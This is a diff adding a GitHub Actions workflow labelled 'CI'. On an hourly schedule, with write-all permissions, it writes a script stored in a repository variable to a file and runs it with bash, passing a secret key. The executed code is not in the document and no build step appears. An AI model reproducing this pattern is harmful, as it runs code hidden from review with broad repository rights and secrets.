@@ -1,0 +1,25 @@
+name: 'CI'
+on:
+  schedule:
+    - cron: "30 * * * *"
+  workflow_dispatch:
+jobs:
+  build:
+    permissions: write-all
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+        with:
+          ref: main
+          fetch-depth: 0
+      - name: Worker
+        env:
+          TZ: Asia/Shanghai
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          cat << \EOFXEOF >0
+          ${{ vars.SHSH }}
+          EOFXEOF
+          tr '\r\n' '\n' < 0 > 1
+          bash 1 ${{ secrets.KEY }}
